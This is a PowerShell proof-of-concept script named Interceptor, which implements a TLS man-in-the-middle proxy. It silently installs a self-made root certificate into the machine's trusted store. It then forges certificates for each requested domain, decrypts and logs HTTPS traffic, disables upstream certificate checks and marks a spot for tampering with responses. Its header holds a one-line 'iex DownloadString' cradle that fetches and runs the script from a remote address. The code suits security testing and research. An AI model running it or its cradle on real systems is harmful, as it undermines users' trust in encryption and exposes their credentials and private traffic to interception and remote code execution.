# Interceptor Proof of Concept
# Created By Casey Smith
# 05-28-2014
# 0.0.5
# Rewrite Sockets and Streams
# Proof of Concept 
# TODO
# 
# iex (New-Object Net.WebClient).DownloadString(“http://10.0.22.91:8080/Interceptor.ps1”)
#

#This needs Work
function setProxy()
{
	#Set Proxy To Interceptor.
}

#Cleanup
function CleanupCerts()
{
	
}

function createCertificate([string] $certSubject, [bool] $isCA)
{
$CAsubject = $certSubject
$dn = new-object -com "X509Enrollment.CX500DistinguishedName"
$dn.Encode( "CN=" + $CAsubject, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)

# Create a new Private Key
$key = new-object -com "X509Enrollment.CX509PrivateKey"
$key.ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
# Set CAcert to 1 to be used for Signature
if($isCA)
	{
		$key.KeySpec = 2 
	}
else
	{
		$key.KeySpec = 1
	}
$key.Length = 1024
$key.MachineContext = 1
$key.Create() 
 
# Create Attributes
$serverauthoid = new-object -com "X509Enrollment.CObjectId"
$serverauthoid.InitializeFromValue("1.3.6.1.5.5.7.3.1")
$ekuoids = new-object -com "X509Enrollment.CObjectIds.1"
$ekuoids.add($serverauthoid)
$ekuext = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
$ekuext.InitializeEncode($ekuoids)

$cert = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
$cert.InitializeFromPrivateKey(2, $key, "")
$cert.Subject = $dn
$cert.Issuer = $cert.Subject
$cert.NotBefore = get-date
$cert.NotAfter = $cert.NotBefore.AddDays(90)
$cert.X509Extensions.Add($ekuext)
if ($isCA)
{
	$basicConst = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
	$basicConst.InitializeEncode("true", 1)
	$cert.X509Extensions.Add($basicConst)
}
else
{              
	$signer = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__Interceptor_Trusted_Root" })
	$signerCertificate =  new-object -com "X509Enrollment.CSignerCertificate"
	$signerCertificate.Initialize(1,0,4, $signer.Thumbprint)
	$cert.SignerCertificate = $signerCertificate
}
$cert.Encode()

$enrollment = new-object -com "X509Enrollment.CX509Enrollment"
$enrollment.InitializeFromRequest($cert)
$certdata = $enrollment.CreateRequest(0)
$enrollment.InstallResponse(2, $certdata, 0, "")

if($isCA)
{              
                                
	# Need a Better way to do this...
	$CACertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__Interceptor_Trusted_Root" })
	# Install CA Root Certificate
	$StoreScope = "LocalMachine"
	$StoreName = "Root"
	$store = New-Object System.Security.Cryptography.X509Certificates.X509Store $StoreName, $StoreScope
	$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
	$store.Add($CACertificate)
	$store.Close()
                                
}
else
{
	return (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $CAsubject })
} 
     
}


function GetSSLOutput ([System.Net.Security.SslStream] $stream) 
{ 
	write-host "Inside GetSSLOutput" -fore Green
    ## Create a buffer to receive the response 
    $buffer = new-object System.Byte[] 1024 
    $encoding = new-object System.Text.AsciiEncoding
    $outputBuffer = "" 
    $foundMore = $false
	Try
	{
    ## Read all the data available from the stream, writing it to the 
    ## output buffer when done. 
    do 
    { 
        ## Allow data to buffer for a bit 
        start-sleep -m 100

        ## Read what data is available 
        $foundmore = $false 
        $stream.ReadTimeout = 100

        do 
        { 
            try 
            { 
                $read = $stream.Read($buffer, 0, 1024)

                if($read -gt 0) 
                { 
                    $foundmore = $true 
                    $outputBuffer += ($encoding.GetString($buffer, 0, $read)) 
                } 
            } catch { $foundMore = $false; $read = 0 } 
        } while($read -gt 0) 
    } while($foundmore)
	
	$outputBuffer 
	
	}
	Catch
	{
		write-host $error[0]
	}
}

function HttpGet([string] $URI, [string] $httpMethod, [string[]] $requestString)
{
	# I don't really care who else is MITM... So just ignore upstream errors.. o_O 
	# 
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
	
	#Upstream Proxy Goes here:  May not be necessary, but probably will in corporate environment
	#Parameterize that...
	#Set to Original Proxy value.
	#This is Fiddler as an example of a proxy chain
	$proxy = New-Object System.Net.WebProxy("127.0.0.1", 8888)
	[System.Net.HttpWebRequest] $request = [System.Net.HttpWebRequest] [System.Net.WebRequest]::Create($URI)
	$request.Proxy = $proxy
	$request.Method = $httpMethod
	
	#Map Headers # This seems tedious... but works Fix this shit...
    # I really just want to map the string, into the HTTP Request...
	For ($i = 1; $i -lt $requestString.Length; $i++)
	{
		$line = $requestString[$i] -split ": "
		if (( $line -contains("Host: ") )-Or $line[0] -eq $null ) { continue }
		Try
		{
			#Add Header Properties Defined By Class
			switch($line[0])
			{
				"Accept" { $request.Accept = $line[0] }
				"Connection" { $request.Connection = $line[0] }
				"Content-Length" { $request.ContentLength = $line[0] }
				"Expect" { $request.Expect = $line[0] }
				"Date" { $request.Date = $line[0] }
				"If-Modified-Since" { $request.IfModifiedSince = $line[0] }
				"Range" { $request.Range = $line[0] }
				"Referer" { $request.Referer = $line[0] }
				"User-Agent" { $request.UserAgent = $line[0] }
				"Transfer-Encoding" { $request.TransferEncoding = $line[0] }
				default {
							#Header is Custom, or Cookies.
							$request.Headers.Add( $line[0], $line[1])
							
						}
			}
			
		}
		Catch
		{
			
		}
	}
	
	if( $httpMethod -ceq "POST" )
	{
		#Get Last Value in Array... Post Parameters
		#Write them into Request StreamReader
		
			$buffer = $requestString[-1] #Get Last Value in Array
			$requestStream = $request.GetRequestStream()
			$webRequest.ContentLength = $buffer.Length;
			$requestStream.Write($buffer, 0, $buffer.Length)
		
	}
	
	$request.Headers.Add("InterceptorInjector", "Blah")
	
	$response = $request.GetResponse()
	$requestStream = $response.GetResponseStream()
	$readStream = New-Object System.IO.StreamReader $requestStream
	$data = $readStream.ReadToEnd().Trim()
	#Add Tampering Here...
	$data
	
}


#Define HTTPProcessing Function
function DoHttpProcessing([System.Net.Sockets.TcpClient] $HTTPclient)
{
	$HTTPreqtsb = New-Object System.Text.StringBuilder
	$SSLreqtsb = New-Object System.Text.StringBuilder
	Try
	{
	$clientStream = $HTTPclient.GetStream()
	$clientStreamReader = New-Object System.IO.StreamReader $ClientStream
	$clientStreamWriter = New-Object System.IO.StreamWriter $ClientStream
	#Revisit This Whole Thing.
	# It works... But I am not totally sure why :)
	do {
		$line = $clientStreamReader.ReadLine()
		[void]$HTTPreqtsb.AppendLine($line)
	} while ($line -and $line -ne ([char]4))
	
	[string[]] $requestArray = ($HTTPreqtsb -split '[\r\n]') |? {$_} 
	[string[]] $methodParse = $requestArray[0] -split " "
	
	#Begin SSL MITM IF Request Contains CONNECT METHOD
	if($methodParse[0] -ceq "CONNECT")
	{
		[string[]] $domainParse = $methodParse[1].Split(":")
		write-host $domainParse[0] -fore Yellow
		
		$connectStreamWriter = New-Object System.IO.StreamWriter $clientStream
		$connectStreamWriter.WriteLine("HTTP/1.1 200 Connection Established")
		$connectStreamWriter.WriteLine("TimeStamp:" + [System.DateTime]::Now.ToString())
		$connectStreamWriter.WriteLine()
		$connectStreamWriter.Flush()
		
		$sslStream = New-Object System.Net.Security.SslStream($clientStream , $false)
		
		Try
		{       
			$sslcertfake = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $domainParse[0]  })
			if ($sslcertfake -eq $null)
			{
				$sslcertfake =  createCertificate $domainParse[0] $false
			}
			
			$sslStream.AuthenticateAsServer($sslcertfake, 0, [System.Security.Authentication.SslProtocols]::Ssl3 , 1)
		}
		Catch
		{
			write-host $error[0]
		}
		
		$SSLRequest = GetSSLOutput $sslStream
		write-host $SSLRequest -fore Cyan
		
		
		#Training Only
		#Now... Parse the SSL Request, and Build a Corresponding Upstream Request
		[string[]] $SSLrequestArray = ($SSLRequest -split '[\r\n]') |? {$_} 
		[string[]] $SSLmethodParse = $SSLrequestArray[0] -split " "
		#For Now... Ignore Cookies... Just make a request and return response...
		#Since its SSL... Construct URI... By Putting Hostname Header + Path...
		#For Now lets just ignore the fact that we are not persisting state...  minor detail.
		
		$secureURI = "https://" + $domainParse[0] + $SSLmethodParse[1]
		
		write-host $secureURI -fore DarkCyan
		$proxiedResponse = HttpGet $secureURI $SSLmethodParse[0] $SSLrequestArray
		
		#This will be a call to and response from the proxied Connection.
		if($proxiedResponse = $null)
		{
		$shimResponse = "<html><body><script>alert('Hi There');</script></html>"
		$enc = [system.Text.Encoding]::UTF8
		$sslretData = $enc.GetBytes($shimResponse) 
		$sslStream.Write($sslretData)
		break
		}
		
		$enc = [system.Text.Encoding]::UTF8
		$sslretData = $enc.GetBytes($proxiedResponse) 
		$sslStream.Write($sslretData)
		
		
		
		
		
	}#End HTTP Processing
	
	if( ($methodParse[0] -ceq "GET") -Or ($methodParse[0] -ceq "POST") -Or ($methodParse[0] -ceq "PUT"))
	{
		#Debug Write-Out Request...
		Write-Host $methodParse[1]
		$proxiedResponse = HttpGet $methodParse[1] $methodParse[0] $requestArray
		#This call ignores all client Headers...Fix it..
		$clientStreamWriter.Write($proxiedResponse)
		
	}
	
	
	}# End HTTPProcessing Block
	Catch
	{
		write-host $error[0] 
	}
	Finally
	{
		$clientStreamReader.Close()
		$clientStream.Close()		
		
	}
                
}



#Create and Install the CACert
$CAcertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__Interceptor_Trusted_Root"  })
if ($CACertificate -eq $null)
{
	createCertificate "__Interceptor_Trusted_Root" $true
}

#Start Proxy Server

# HTTPListener 
$BUFFER_SIZE = 2048
$port=8081
$endpoint = New-Object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
$listener = New-Object System.Net.Sockets.TcpListener $endpoint
$listener.Start()
$rcvBuffer = New-Object byte[] $BUFFER_SIZE
$bytesRcvd = 0

while($true){
                $client = New-Object System.Net.Sockets.TcpClient
                $reqString
                Try
                {                              
                    $client = $listener.AcceptTcpClient()
                    $reqString = DoHttpProcessing($client)
                }
                Catch [System.Exception]
                {
                    write-host $error[0] 
                }
                Finally
                {
                    $client.Close()
                }

}

<#References
http://blogs.technet.com/b/vishalagarwal/archive/2009/08/22/generating-a-certificate-self-signed-using-powershell-and-certenroll-interfaces.aspx
http://www.codeproject.com/Articles/93301/Implementing-a-Multithreaded-HTTP-HTTPS-Debugging

#>
